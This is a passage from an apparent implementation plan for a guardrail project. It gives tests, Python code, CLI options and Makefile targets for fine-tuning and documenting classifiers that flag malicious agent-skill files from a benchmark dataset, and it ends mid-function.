CFG = """
protocol: MSD
train_split: train
val_split: val
seeds: [0, 1, 2]
policy: shared
weights_license: apache-2.0
models:
  demo-ft:
    trainer: demo
    base_model: org/base
    base_revision: abc
    base_card: https://huggingface.co/org/base
    base_license: apache-2.0
    max_tokens: 8
    epochs: 2
"""


def _data(tmp_path: Path, leak: bool = False):
    rows = []
    for n in range(12):
        msd = "train" if n < 8 else ("val" if n < 10 else "test")
        rows.append(Item(id=f"msb:{n:03d}", track="skills", text=f"skill {n}", label=n % 2, split=msd,
                         source="malicious_skill_bench", meta={"splits": {"MSD": msd, "SD": "train"}, "license": "CC-BY-4.0"}))
    if leak:
        rows.append(Item(id="msb:000", track="skills", text="dup", label=1, split="val", meta={"splits": {"MSD": "val"}}))
    data = tmp_path / "data"
    data.mkdir()
    write_jsonl(data / "skills.jsonl", rows)
    (data / "skills.build.json").write_text(json.dumps({"sources": {"malicious_skill_bench": {
        "kind": "hf", "dataset": "ProtectSkills/MaliciousSkillBench", "config": "primary", "split": "train"}}}))
    cfg = tmp_path / "finetune.yaml"
    cfg.write_text(CFG)
    return data, cfg


def test_train_dispatches_writes_manifest_and_ids_file(tmp_path: Path, monkeypatch):
    data, cfg = _data(tmp_path)
    seen = {}

    def demo(train_items, val_items, policy, seed_dir, seed, hp, base_dir, device):
        seen.update(n_train=len(train_items), n_val=len(val_items), seed=seed, hp=hp, base=base_dir, device=device,
                    policy=policy.name)
        (Path(seed_dir) / "model").mkdir(parents=True)
        return {"loss": 0.1}

    import nar_guardrails.train.run as run_mod
    monkeypatch.setattr(run_mod, "benchmark_record", lambda d: {"dataset": "ProtectSkills/MaliciousSkillBench", "revision": None})
    req = TrainRequest(model="demo-ft", seed=1, config_path=cfg, models_dir=tmp_path / "models", data_dir=data,
                       docs_dir=tmp_path / "cards", epochs=5, device="cpu")
    path = train(req, trainers={"demo": demo}, resolve_base=lambda mid, rev: tmp_path / "base")
    m = json.loads(path.read_text())
    assert path == tmp_path / "models" / "demo-ft" / "seed1" / "training_manifest.json"
    assert (seen["n_train"], seen["n_val"], seen["seed"], seen["device"], seen["policy"]) == (8, 2, 1, "cpu", "shared")
    assert seen["base"] == tmp_path / "base"
    assert seen["hp"]["epochs"] == 5 and seen["hp"]["max_tokens"] == 8 and seen["hp"]["base_model"] == "org/base"
    assert m["hyperparameters"] == {"max_tokens": 8, "epochs": 5} and m["base"]["revision"] == "abc"
    assert m["training_set"]["n_items"] == 8 and "ids" not in m["training_set"] and m["validation_set"]["n_items"] == 2
    assert m["policy"]["hash"] and m["policy"]["question"] and m["result"] == {"loss": 0.1}
    assert m["checkpoint"] == str(tmp_path / "models" / "demo-ft" / "seed1" / "model")
    ids = json.loads((tmp_path / "cards" / "training-set-MSD-train.json").read_text())
    assert ids["ids"] == [f"msb:{n:03d}" for n in range(8)] and m["training_set"]["ids_file"].endswith("training-set-MSD-train.json")
    assert m["environment"]["python"] and m["started"] <= m["finished"]


def test_train_with_limit_subsamples_and_skips_ids_file(tmp_path: Path, monkeypatch):
    data, cfg = _data(tmp_path)
    import nar_guardrails.train.run as run_mod
    monkeypatch.setattr(run_mod, "benchmark_record", lambda d: {})

    def demo(train_items, val_items, policy, seed_dir, seed, hp, base_dir, device):
        assert len(train_items) == 4 and len(val_items) == 2
        return {}

    req = TrainRequest(model="demo-ft", seed=0, limit=4, config_path=cfg, models_dir=tmp_path / "models", data_dir=data,
                       docs_dir=tmp_path / "cards")
    train(req, trainers={"demo": demo}, resolve_base=lambda mid, rev: tmp_path)
    assert not (tmp_path / "cards").exists()


def test_train_refuses_leaky_split_and_unknown_key(tmp_path: Path):
    data, cfg = _data(tmp_path, leak=True)
    req = TrainRequest(model="demo-ft", seed=0, config_path=cfg, models_dir=tmp_path / "models", data_dir=data)
    with pytest.raises(ValueError, match="held-out"):
        train(req, trainers={"demo": lambda *a: {}}, resolve_base=lambda mid, rev: tmp_path)
    with pytest.raises(KeyError, match="unknown fine-tune key"):
        train(TrainRequest(model="nope", seed=0, config_path=cfg, data_dir=data), trainers={}, resolve_base=lambda m, r: tmp_path)


def test_resolve_base_dir_and_benchmark_record_never_touch_the_network(tmp_path: Path, monkeypatch):
    import huggingface_hub
    calls = []

    def fake_snapshot(repo, revision=None, repo_type=None, local_files_only=False):
        calls.append((repo, revision, repo_type, local_files_only))
        if repo == "missing/base":
            raise OSError("not cached")
        return str(tmp_path / "cache" / "snapshots" / "deadbeef")

    monkeypatch.setattr(huggingface_hub, "snapshot_download", fake_snapshot)
    from nar_guardrails.train.run import benchmark_record, resolve_base_dir
    assert resolve_base_dir("org/base", "abc") == tmp_path / "cache" / "snapshots" / "deadbeef"
    with pytest.raises(FileNotFoundError, match="nar fetch-bases"):
        resolve_base_dir("missing/base", "abc")
    data, _ = _data(tmp_path)
    rec = benchmark_record(data)
    assert rec["revision"] == "deadbeef" and rec["dataset"] == "ProtectSkills/MaliciousSkillBench"
    assert len(rec["build_manifest_sha256"]) == 64
    assert calls and all(c[3] is True for c in calls)   # every call was local_files_only


def test_training_set_file_must_not_change(tmp_path: Path):
    rec = {"protocol": "MSD", "split": "train", "ids": ["a"], "benchmark": {"revision": "x"}}
    p = write_training_set_file(tmp_path, rec)
    assert "benchmark" not in json.loads(p.read_text())
    write_training_set_file(tmp_path, {**rec, "benchmark": {"revision": "y"}})  # benchmark block is not compared
    with pytest.raises(ValueError, match="differs"):
        write_training_set_file(tmp_path, {**rec, "ids": ["b"]})
```

Append to `tests/test_cli.py`:

```python
def test_cli_train_builds_request(monkeypatch, tmp_path):
    import nar_guardrails.train.run as run_mod
    seen = {}
    monkeypatch.setattr(run_mod, "train", lambda req: seen.setdefault("req", req) and tmp_path / "m.json")
    from nar_guardrails.cli import main
    assert main(["train", "--model", "laya-ft", "--seed", "2", "--limit", "16", "--epochs", "1", "--device", "cpu"]) == 0
    r = seen["req"]
    assert (r.model, r.seed, r.limit, r.epochs, r.device) == ("laya-ft", 2, 16, 1, "cpu")
    assert str(r.config_path) == "configs/finetune.yaml" and str(r.models_dir) == "models"


def test_cli_fetch_bases(monkeypatch, capsys, tmp_path):
    import nar_guardrails.train.run as run_mod
    seen = {}
    monkeypatch.setattr(run_mod, "fetch_bases", lambda cfg, models=None: seen.setdefault("models", models) or [tmp_path / "snap"])
    from nar_guardrails.cli import main
    assert main(["fetch-bases", "--model", "laya-ft"]) == 0
    assert seen["models"] == ["laya-ft"] and "snap" in capsys.readouterr().out
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_train_run.py tests/test_cli.py -k "train" -q`
Expected: FAIL with `ModuleNotFoundError: nar_guardrails.train.run`

- [ ] **Step 3: Implement**

`nar_guardrails/train/run.py`:

```python
"""`nar train`: select data, resolve the pinned base, call one trainer, write the manifest and the ids file."""
from __future__ import annotations

import json
import os
from dataclasses import dataclass
from pathlib import Path

import yaml

from nar_guardrails.bench.manifest import collect_environment, file_sha256
from nar_guardrails.detectors.policy import load_policy
from nar_guardrails.schema import read_items
from nar_guardrails.train.data import assert_disjoint, limit_items, select_split, training_set_record
from nar_guardrails.train.manifest import now_iso, write_training_manifest

TRAINING_SET_FILE = "training-set-{protocol}-{split}.json"
BASE_KEYS = ("base_model", "base_revision", "base_card", "base_license")


@dataclass
class TrainRequest:
    model: str
    seed: int
    limit: int | None = None
    epochs: int | None = None
    max_tokens: int | None = None
    device: str = "auto"
    config_path: Path = Path("configs/finetune.yaml")
    models_dir: Path = Path("models")
    data_dir: Path = Path("data/processed")
    docs_dir: Path = Path("docs/model-cards")


def load_finetune_cfg(path: Path) -> dict:
    return yaml.safe_load(Path(path).read_text(encoding="utf-8"))


def fetch_bases(cfg: dict, models: list[str] | None = None) -> list[Path]:
    """The one network step: download the pinned base snapshots, as files, into the local Hub cache.

    Run once (`nar fetch-bases`); everything else runs with HF_HUB_OFFLINE=1.
    """
    from huggingface_hub import snapshot_download

    out = []
    for key, hp in cfg["models"].items():
        if models and key not in models:
            continue
        out.append(Path(snapshot_download(hp["base_model"], revision=hp["base_revision"])))
    return out


def resolve_base_dir(model_id: str, revision: str) -> Path:
    """Local snapshot of the pinned base revision; never touches the network."""
    from huggingface_hub import snapshot_download

    try:
        return Path(snapshot_download(model_id, revision=revision, local_files_only=True))
    except Exception as e:
        raise FileNotFoundError(f"{model_id}@{revision} is not in the local Hub cache; run `nar fetch-bases` once "
                                f"(the only step that downloads anything): {type(e).__name__}: {e}") from e


def benchmark_record(data_dir: Path) -> dict:
    """MaliciousSkillBench source block from the build manifest plus the revision of its cached snapshot.

    The revision is the snapshot directory name in the local Hub cache (what `nar data build` downloaded);
    no Hub API call is made. None when the cache holds no snapshot.
    """
    build = Path(data_dir) / "skills.build.json"
    src = json.loads(build.read_text(encoding="utf-8")).get("sources", {}).get("malicious_skill_bench", {})
    revision = None
    if src.get("dataset"):
        try:
            from huggingface_hub import snapshot_download

            revision = Path(snapshot_download(src["dataset"], repo_type="dataset", local_files_only=True)).name
        except Exception:  # not in the cache: the card says the revision was not resolved
            pass
    return {**src, "revision": revision, "build_manifest_sha256": file_sha256(build)}


def write_training_set_file(docs_dir: Path, record: dict) -> Path:
    """One shared ids file per training split; every writer must produce byte-identical content."""
    path = Path(docs_dir) / TRAINING_SET_FILE.format(protocol=record["protocol"], split=record["split"])
    body = json.dumps({k: v for k, v in record.items() if k != "benchmark"}, indent=1, sort_keys=True) + "\n"
    if path.exists() and path.read_text(encoding="utf-8") != body:
        raise ValueError(f"{path} differs from the current training set: the data changed since an earlier run")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body, encoding="utf-8")
    return path


def _trainers() -> dict:
    from nar_guardrails.train.gliner2_ft import train_gliner2_decide
    from nar_guardrails.train.laya_ft import train_laya
    from nar_guardrails.train.modernbert_ft import train_modernbert

    return {"laya": train_laya, "gliner2": train_gliner2_decide, "modernbert": train_modernbert}


def train(req: TrainRequest, trainers: dict | None = None, resolve_base=resolve_base_dir) -> Path:
    os.environ.setdefault("HF_HUB_OFFLINE", "1")  # the lab never talks to an API; bases come from the local cache
    cfg = load_finetune_cfg(req.config_path)
    if req.model not in cfg["models"]:
        raise KeyError(f"unknown fine-tune key {req.model!r}; known: {sorted(cfg['models'])}")
    hp = dict(cfg["models"][req.model])
    if req.epochs is not None:
        hp["epochs"] = req.epochs
    if req.max_tokens is not None:
        hp["max_tokens"] = req.max_tokens
    trainers = trainers if trainers is not None else _trainers()
    if hp["trainer"] not in trainers:
        raise KeyError(f"no trainer {hp['trainer']!r} for {req.model}; known: {sorted(trainers)}")
    protocol, train_split, val_split = cfg["protocol"], cfg["train_split"], cfg["val_split"]
    items_path = Path(req.data_dir) / "skills.jsonl"
    items = read_items(items_path)
    train_items = select_split(items, protocol, train_split)
    val_items = select_split(items, protocol, val_split)
    assert_disjoint(train_items, val_items, select_split(items, protocol, "test"))
    train_items = limit_items(train_items, req.limit, req.seed)
    val_items = limit_items(val_items, req.limit, req.seed)
    policy = load_policy("skills", cfg.get("policy", "shared"))
    seed_dir = Path(req.models_dir) / req.model / f"seed{req.seed}"
    seed_dir.mkdir(parents=True, exist_ok=True)
    base_dir = resolve_base(hp["base_model"], hp["base_revision"])
    started = now_iso()
    result = trainers[hp["trainer"]](train_items, val_items, policy, seed_dir, req.seed, hp, base_dir, req.device)
    finished = now_iso()
    bench = benchmark_record(req.data_dir)
    record = training_set_record(train_items, items_path, protocol, train_split, bench)
    ids_file = str(write_training_set_file(req.docs_dir, record)) if req.limit is None else None
    val_record = training_set_record(val_items, items_path, protocol, val_split, bench)
    manifest = {
        "key": req.model, "seed": req.seed, "trainer": hp["trainer"], "limit": req.limit,
        "checkpoint": str(seed_dir / "model"),
        "base": {"model_id": hp["base_model"], "revision": hp["base_revision"], "card": hp["base_card"],
                 "license": hp["base_license"], "local_dir": str(base_dir)},
        "hyperparameters": {k: v for k, v in hp.items() if k not in BASE_KEYS and k != "trainer"},
        "policy": {"name": policy.name, "hash": policy.hash, "question": policy.question,
                   "malicious": policy.malicious, "benign": policy.benign},
        "training_set": {**{k: v for k, v in record.items() if k != "ids"}, "ids_file": ids_file},
        "validation_set": {k: v for k, v in val_record.items() if k != "ids"},
        "result": result, "environment": collect_environment(), "device": req.device,
        "weights_license": cfg.get("weights_license"), "started": started, "finished": finished,
    }
    return write_training_manifest(seed_dir, manifest)
```

`nar_guardrails/cli.py` — add the subparser:

```python
    t = sub.add_parser("train", help="fine-tune one skill-track model on the MSD train manifest (spec §9)")
    t.add_argument("--model", required=True, help="key in configs/finetune.yaml, e.g. laya-ft")
    t.add_argument("--seed", type=int, required=True)
    t.add_argument("--limit", type=int, default=None, help="balanced subsample for smoke runs (no ids file is written)")
    t.add_argument("--epochs", type=int, default=None)
    t.add_argument("--max-tokens", type=int, default=None)
    t.add_argument("--device", default="auto")
    t.add_argument("--config", default="configs/finetune.yaml")
    t.add_argument("--models-dir", default="models")
    t.add_argument("--data-dir", default="data/processed")
    t.add_argument("--docs-dir", default="docs/model-cards")
    fb = sub.add_parser("fetch-bases", help="download the pinned base snapshots into the local Hub cache (the only network step)")
    fb.add_argument("--model", default=None, help="one key from configs/finetune.yaml; default: all")
    fb.add_argument("--config", default="configs/finetune.yaml")
```

and the dispatch:

```python
    if args.cmd == "fetch-bases":
        from pathlib import Path
        from nar_guardrails.train.run import fetch_bases, load_finetune_cfg
        for p in fetch_bases(load_finetune_cfg(Path(args.config)), [args.model] if args.model else None):
            print(p)
        return 0
```

```python
    if args.cmd == "train":
        from pathlib import Path
        from nar_guardrails.train.run import TrainRequest, train
        print(train(TrainRequest(model=args.model, seed=args.seed, limit=args.limit, epochs=args.epochs,
                                 max_tokens=args.max_tokens, device=args.device, config_path=Path(args.config),
                                 models_dir=Path(args.models_dir), data_dir=Path(args.data_dir),
                                 docs_dir=Path(args.docs_dir))))
        return 0
```

`Makefile` additions (tabs, not spaces):

```make
FT_MODELS ?= laya-ft gliner2-decide-ft modernbert-ft
FT_SEEDS ?= 0 1 2
.PHONY: fetch-bases finetune-probe finetune bench-ft publish-results
finetune-probe finetune bench-ft: export HF_HUB_OFFLINE = 1
fetch-bases:
	uv run nar fetch-bases
finetune-probe:
	for m in $(FT_MODELS); do uv run nar train --model $$m --seed 0 --limit 64 --epochs 1 --models-dir models/probe || exit 1; done
finetune:
	for m in $(FT_MODELS); do for s in $(FT_SEEDS); do \
	  if [ -f models/$$m/seed$$s/training_manifest.json ]; then echo "skip $$m seed$$s (done)"; \
	  else uv run nar train --model $$m --seed $$s || exit 1; fi; done; done
bench-ft:
	uv run nar run --track skills --split val  --detectors all --protocol MSD --run-id skills-val-msd-ft
	uv run nar run --track skills --split test --detectors all --protocol MSD --run-id skills-test-msd-ft --throughput
	uv run nar run --track skills --split test --detectors all --protocol SD --exclude-split MSD:train --exclude-split MSD:val --run-id skills-test-sd-ft
	uv run nar report --run skills-test-msd-ft --dev-run skills-val-msd-ft
	uv run nar report --run skills-test-sd-ft  --dev-run skills-val-msd-ft
	for m in $(FT_MODELS); do uv run nar card --model $$m --val-run skills-val-msd-ft --test-run skills-test-msd-ft --sd-run skills-test-sd-ft || exit 1; done
publish-results:
	mkdir -p docs/results
	for d in results/*/; do r=$$(basename $$d); if [ -f $$d/report.md ]; then cp $$d/report.md docs/results/$$r.md; cp $$d/leaderboard.csv docs/results/$$r.leaderboard.csv 2>/dev/null || true; fi; done
```

`docs/model-cards/README.md`:

```markdown
# Model cards

Generated by `nar card` from each checkpoint's `models/<key>/seed<N>/training_manifest.json` and the benchmark
runs named on the command line. Do not edit the cards by hand; re-run `make bench-ft`.

- `<key>-seed<N>.md` — one card per fine-tuned checkpoint: base model and Hub revision with a link to the
  provider's original card, licence, exact training split (benchmark + revision, id list, sha256 of the id list
  and of the items file), hyperparameters, seed, policy text and hash, metrics at the thresholds frozen on
  the validation run, hardware and package versions.
- `<key>.md` — mean ± std over seeds.
- `training-set-MSD-train.json` — the id list shared by every checkpoint trained on the MSD train manifest.
  Item ids are `msb:<benchmark id>` from `ProtectSkills/MaliciousSkillBench`; the items file they index is
  rebuilt with `nar data build --track skills` and must hash to the `items_sha256` in the cards.

Weights are not stored in git (`models/` is ignored). To reproduce a checkpoint:
`uv run nar train --model <key> --seed <N>` with the pinned base revision in `configs/finetune.yaml`.
```

- [ ] **Step 4: Run the whole suite**

Run: `uv run pytest -q`
Expected: all pass

- [ ] **Step 5: Commit**

```bash
git add nar_guardrails/train/run.py nar_guardrails/cli.py Makefile docs/model-cards/README.md tests/test_train_run.py tests/test_cli.py
git commit -m "feat(train): nar train orchestration, training-set ids file and finetune Makefile targets"
```

---

### Task 8: Model cards (`nar_guardrails/train/card.py`, `nar card`)

**Files:**
- Create: `nar_guardrails/train/card.py`
- Modify: `nar_guardrails/cli.py` (add `card` subcommand)
- Test: `tests/test_card.py`, `tests/test_cli.py`

**Interfaces:**
- Consumes: manifest schema from Task 7; `results/<run>/leaderboard.csv` (columns include `detector, n, recall, fpr, precision, f1, auroc, fpr_at_r95, errors, truncated`, written by `nar report`); `results/<test-run>/thresholds.json` (`{detector: {"f1": thr, "recall95": thr, "recall99": thr, ...}}`); `nar_guardrails.report.tables.seed_aggregate(df, cols)`; `read_training_manifest`.
- Produces: `leaderboard_row(results_dir, run_id, detector) -> dict | None`, `frozen_thresholds(results_dir, run_id, detector) -> dict`, `render_card(manifest, detector, evals: dict[str, dict | None], thresholds) -> str`, `write_cards(key, seeds, models_dir, results_dir, docs_dir, val_run, test_run, sd_run) -> list[Path]`, CLI `nar card --model KEY [--seeds 0,1,2] --val-run R --test-run R [--sd-run R] [--models-dir P] [--results-dir P] [--docs-dir P]`.

- [ ] **Step 1: Write the failing tests**

`tests/test_card.py`:

```python
import json
from pathlib import Path

import pandas as pd

from nar_guardrails.train.card import frozen_thresholds, leaderboard_row, render_card, write_cards
from nar_guardrails.train.manifest import write_training_manifest

MANIFEST = {
    "key": "laya-ft", "seed": 0, "trainer": "laya", "limit": None, "checkpoint": "models/laya-ft/seed0/model",
    "base": {"model_id": "convaiinnovations/laya", "revision": "7b928d8", "card": "https://huggingface.co/convaiinnovations/laya",
             "license": "apache-2.0", "local_dir": "/cache"},
    "hyperparameters": {"max_tokens": 512, "epochs": 3},
    "policy": {"name": "shared", "hash": "abc123def456", "question": "Is this skill malicious?", "malicious": "M text", "benign": "B text"},
    "training_set": {"protocol": "MSD", "split": "train", "n_items": 6818, "n_malicious": 5254, "n_benign": 1564,
                     "items_file": "data/processed/skills.jsonl", "items_sha256": "f" * 64, "ids_sha256": "e" * 64,
                     "sources": {"malicious_skill_bench": 6818}, "licenses": {"CC-BY-4.0": 6818},
                     "benchmark": {"dataset": "ProtectSkills/MaliciousSkillBench", "config": "primary", "revision": "d4b42ce"},
                     "ids_file": "docs/model-cards/training-set-MSD-train.json"},
    "validation_set": {"protocol": "MSD", "split": "val", "n_items": 974},
    "result": {"n_train": 6818}, "environment": {"python": "3.12.3", "machine": "arm64", "device": "mps",
                                                 "packages": {"laya": "0.4.8"}, "git_commit": "9807e90", "git_dirty": False},
    "device": "auto", "weights_license": "apache-2.0", "started": "2026-10-22T01:00:00+00:00", "finished": "2026-10-22T03:00:00+00:00",
}


def _results(tmp_path: Path, seeds=(0, 1)):
    for run, rec in (("skills-test-msd-ft", 0.9), ("skills-test-sd-ft", 0.8)):
        d = tmp_path / "results" / run
        d.mkdir(parents=True)
        rows = [{"detector": f"laya-ft-seed{s}", "n": 2051, "recall": rec + s * 0.02, "fpr": 0.05, "precision": 0.9, "f1": 0.9,
                 "auroc": 0.95, "fpr_at_r95": 0.1, "errors": 0, "truncated": 3} for s in seeds] + [{"detector": "laya", "n": 2051, "recall": 0.5}]
        pd.DataFrame(rows).to_csv(d / "leaderboard.csv", index=False)
        (d / "thresholds.json").write_text(json.dumps({f"laya-ft-seed{s}": {"f1": 0.42, "recall95": 0.2, "recall99": 0.1, "dev": {}} for s in seeds}))
    return tmp_path / "results"


def test_leaderboard_row_and_thresholds(tmp_path: Path):
    r = _results(tmp_path)
    assert leaderboard_row(r, "skills-test-msd-ft", "laya-ft-seed1")["recall"] == 0.92
    assert leaderboard_row(r, "skills-test-msd-ft", "nope") is None and leaderboard_row(r, "missing-run", "laya") is None
    assert frozen_thresholds(r, "skills-test-msd-ft", "laya-ft-seed0") == {"f1": 0.42, "recall95": 0.2, "recall99": 0.1}
    assert frozen_thresholds(r, "missing-run", "laya-ft-seed0") == {}


def test_render_card_names_base_data_policy_metrics_and_thresholds():
    md = render_card(MANIFEST, "laya-ft-seed0", {"skills-test-msd-ft": {"n": 2051, "recall": 0.9, "fpr": 0.05, "precision": 0.9, "f1": 0.9,
                                                                        "auroc": 0.95, "fpr_at_r95": 0.1, "errors": 0, "truncated": 3},
                                                  "skills-test-sd-ft": None}, {"f1": 0.42, "recall95": 0.2, "recall99": 0.1})
    for needle in ("# laya-ft-seed0", "[convaiinnovations/laya](https://huggingface.co/convaiinnovations/laya)", "`7b928d8`", "apache-2.0",
                   "ProtectSkills/MaliciousSkillBench", "`d4b42ce`", "6818 items (5254 malicious / 1564 benign)", "e" * 64, "f" * 64,
                   "training-set-MSD-train.json", "shared@abc123def456", "Is this skill malicious?", "M text", "B text",
                   "| `skills-test-msd-ft` | 2051 | 0.900 | 0.050 |", "| `skills-test-sd-ft` | not run |", "F1-optimal: 0.42",
                   "`9807e90`", "models/laya-ft/seed0/training_manifest.json", "first 512 tokens"):
        assert needle in md, needle
    assert "do not edit" in md.lower()


def test_write_cards_writes_per_seed_and_aggregate(tmp_path: Path):
    r = _results(tmp_path)
    for s in (0, 1):
        write_training_manifest(tmp_path / "models" / "laya-ft" / f"seed{s}", {**MANIFEST, "seed": s, "checkpoint": f"models/laya-ft/seed{s}/model"})
    written = write_cards("laya-ft", [0, 1], tmp_path / "models", r, tmp_path / "cards", "skills-val-msd-ft", "skills-test-msd-ft", "skills-test-sd-ft")
    names = sorted(p.name for p in written)
    assert names == ["MODEL_CARD.md", "MODEL_CARD.md", "laya-ft-seed0.md", "laya-ft-seed1.md", "laya-ft.md"]
    assert (tmp_path / "models" / "laya-ft" / "seed1" / "MODEL_CARD.md").read_text() == (tmp_path / "cards" / "laya-ft-seed1.md").read_text()
    agg = (tmp_path / "cards" / "laya-ft.md").read_text()
    assert "0.910 ± 0.014" in agg and "skills-val-msd-ft" in agg and "[laya-ft-seed0](laya-ft-seed0.md)" in agg
```

Append to `tests/test_cli.py`:

```python
def test_cli_card_calls_write_cards(monkeypatch, tmp_path):
    import nar_guardrails.train.card as card_mod
    seen = {}
    monkeypatch.setattr(card_mod, "write_cards", lambda *a, **k: seen.setdefault("args", (a, k)) and [tmp_path / "x.md"])
    from nar_guardrails.cli import main
    assert main(["card", "--model", "laya-ft", "--seeds", "0,2", "--val-run", "v", "--test-run", "t", "--sd-run", "s"]) == 0
    a, _ = seen["args"]
    assert a[0] == "laya-ft" and a[1] == [0, 2] and a[5:] == ("v", "t", "s")
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_card.py tests/test_cli.py -k card -q`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement**

`nar_guardrails/train/card.py`:

```python
"""Model cards rendered from training manifests and benchmark runs (never hand-edited)."""
from __future__ import annotations

import json
from pathlib import Path

import pandas as pd

from nar_guardrails.report.tables import seed_aggregate
from nar_guardrails.train.manifest import read_training_manifest

METRIC_COLS = ["n", "recall", "fpr", "precision", "f1", "auroc", "fpr_at_r95", "errors", "truncated"]
AGG_COLS = ["recall", "fpr", "auroc", "fpr_at_r95"]


def leaderboard_row(results_dir: Path, run_id: str, detector: str) -> dict | None:
    path = Path(results_dir) / run_id / "leaderboard.csv"
    if not path.exists():
        return None
    df = pd.read_csv(path)
    hit = df[df["detector"] == detector]
    return None if hit.empty else hit.iloc[0].to_dict()


def frozen_thresholds(results_dir: Path, run_id: str, detector: str) -> dict:
    path = Path(results_dir) / run_id / "thresholds.json"
    if not path.exists():
        return {}
    t = json.loads(path.read_text(encoding="utf-8")).get(detector)
    return {k: t.get(k) for k in ("f1", "recall95", "recall99")} if t else {}


COUNT_COLS = {"n", "errors", "truncated"}


def _fmt(v, col: str) -> str:
    if v is None:
        return "n/a"
    try:
        f = float(v)
    except (TypeError, ValueError):
        return str(v)
    if f != f:  # NaN
        return "n/a"
    return str(int(f)) if col in COUNT_COLS else f"{f:.3f}"


def render_card(manifest: dict, detector: str, evals: dict[str, dict | None], thresholds: dict) -> str:
    b, ts, hp, pol, env = (manifest["base"], manifest["training_set"], manifest["hyperparameters"], manifest["policy"],
                           manifest["environment"])
    bench = ts.get("benchmark") or {}
    manifest_path = str(Path(manifest["checkpoint"]).parent / "training_manifest.json")
    lines = [
        f"# {detector}", "",
        f"Fine-tuned `{b['model_id']}` for malicious agent-skill (SKILL.md) detection. Generated by `nar card` from "
        f"`{manifest_path}` — do not edit by hand.", "",
        "## Base model", "",
        f"- Model: [{b['model_id']}]({b['card']}) — the provider's original model card",
        f"- Hub revision: `{b['revision']}`",
        f"- Licence: {b['license']}",
        f"- Fine-tuned weights licence: {manifest.get('weights_license')}", "",
        "## Training data", "",
        f"- Benchmark: `{bench.get('dataset')}` (config `{bench.get('config')}`), Hub revision `{bench.get('revision')}`",
        f"- Split: `{ts['protocol']}` protocol, `{ts['split']}` manifest — {ts['n_items']} items "
        f"({ts['n_malicious']} malicious / {ts['n_benign']} benign)",
        f"- Item ids: `{ts.get('ids_file')}`; sha256 of the id list `{ts['ids_sha256']}`",
        f"- Items file: `{ts['items_file']}`, sha256 `{ts['items_sha256']}`",
        f"- Sources: {json.dumps(ts['sources'])}",
        f"- Licences: {json.dumps(ts['licenses'])}",
        f"- Validation (thresholds, early stopping, calibration): `{manifest['validation_set']['split']}` manifest, "
        f"{manifest['validation_set']['n_items']} items", "",
        "## Recipe", "",
        f"- Trainer: `{manifest['trainer']}`; seed {manifest['seed']}; limit {manifest.get('limit')}",
        "- Hyperparameters:", "", "```json", json.dumps(hp, indent=2, sort_keys=True), "```", "",
        f"- Hardware: {env.get('machine')} / {env.get('device')} (requested `{manifest.get('device')}`); "
        f"{manifest['started']} → {manifest['finished']}",
        f"- Packages: {json.dumps(env.get('packages'))}", "",
        "## Policy text", "",
        f"Policy `{pol['name']}@{pol['hash']}` — the question and label descriptions baked into training; the detector "
        "must be run with the same policy.", "",
        f"> **Question:** {pol['question']}", ">", f"> **Malicious:** {pol['malicious']}", ">", f"> **Benign:** {pol['benign']}", "",
        "## Evaluation", "",
        "| run | n | recall | fpr | precision | f1 | auroc | fpr@r95 | errors | truncated |",
        "|---|---|---|---|---|---|---|---|---|---|",
    ]
    for run_id, row in evals.items():
        if row is None:
            lines.append(f"| `{run_id}` | not run | | | | | | | | |")
        else:
            lines.append(f"| `{run_id}` | " + " | ".join(_fmt(row.get(c), c) for c in METRIC_COLS) + " |")
    lines += [
        "", "Recall/FPR use the F1 threshold frozen on the validation run; `fpr@r95` is the FPR at the validation "
        "threshold that reached 95% recall. The SD run scores only items outside the MSD train/val manifests.", "",
        "## Frozen thresholds (chosen on validation)", "",
        f"- F1-optimal: {thresholds.get('f1')}", f"- recall ≥ 0.95: {thresholds.get('recall95')}",
        f"- recall ≥ 0.99: {thresholds.get('recall99')}", "",
        "## Intended use and limitations", "",
        f"- Input: English SKILL.md text, first {hp.get('max_tokens')} tokens; not evaluated on other languages or on "
        "bundled scripts alone.",
        "- A screening signal for agent-skill review pipelines, not a sole gate: pair it with static analysis of bundled "
        "code and a human review queue.",
        "- Trained on one benchmark; recall on malicious families absent from it is unknown (see the SD run).", "",
        "## Provenance", "",
        f"- Git commit at training: `{env.get('git_commit')}` (dirty: {env.get('git_dirty')})",
        f"- Training manifest: `{manifest_path}`",
    ]
    return "\n".join(lines) + "\n"


def write_cards(key: str, seeds: list[int], models_dir: Path, results_dir: Path, docs_dir: Path, val_run: str,
                test_run: str, sd_run: str | None) -> list[Path]:
    written: list[Path] = []
    rows = []
    for seed in seeds:
        seed_dir = Path(models_dir) / key / f"seed{seed}"
        manifest = read_training_manifest(seed_dir)
        detector = f"{key}-seed{seed}"
        evals = {test_run: leaderboard_row(results_dir, test_run, detector)}
        if sd_run:
            evals[sd_run] = leaderboard_row(results_dir, sd_run, detector)
        card = render_card(manifest, detector, evals, frozen_thresholds(results_dir, test_run, detector))
        for p in (seed_dir / "MODEL_CARD.md", Path(docs_dir) / f"{detector}.md"):
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(card, encoding="utf-8")
            written.append(p)
        if evals[test_run] is not None:
            rows.append({"detector": detector, **{c: evals[test_run].get(c) for c in AGG_COLS}})
    if rows:
        agg = seed_aggregate(pd.DataFrame(rows), AGG_COLS)
        p = Path(docs_dir) / f"{key}.md"
        p.write_text(f"# {key}\n\nMean ± std over seeds {seeds} on `{test_run}` (F1 threshold frozen on `{val_run}`).\n\n"
                     + agg.to_markdown(index=False) + "\n\nPer-seed cards: "
                     + ", ".join(f"[{key}-seed{s}]({key}-seed{s}.md)" for s in seeds) + "\n", encoding="utf-8")
        written.append(p)
    return written
```

`nar_guardrails/cli.py` — subparser and dispatch:

```python
    c = sub.add_parser("card", help="render model cards for a fine-tuned model from its manifests and benchmark runs")
    c.add_argument("--model", required=True)
    c.add_argument("--seeds", default="0,1,2")
    c.add_argument("--val-run", required=True)
    c.add_argument("--test-run", required=True)
    c.add_argument("--sd-run", default=None)
    c.add_argument("--models-dir", default="models")
    c.add_argument("--results-dir", default="results")
    c.add_argument("--docs-dir", default="docs/model-cards")
```

```python
    if args.cmd == "card":
        from pathlib import Path
        from nar_guardrails.train.card import write_cards
        seeds = [int(s) for s in args.seeds.split(",") if s.strip()]
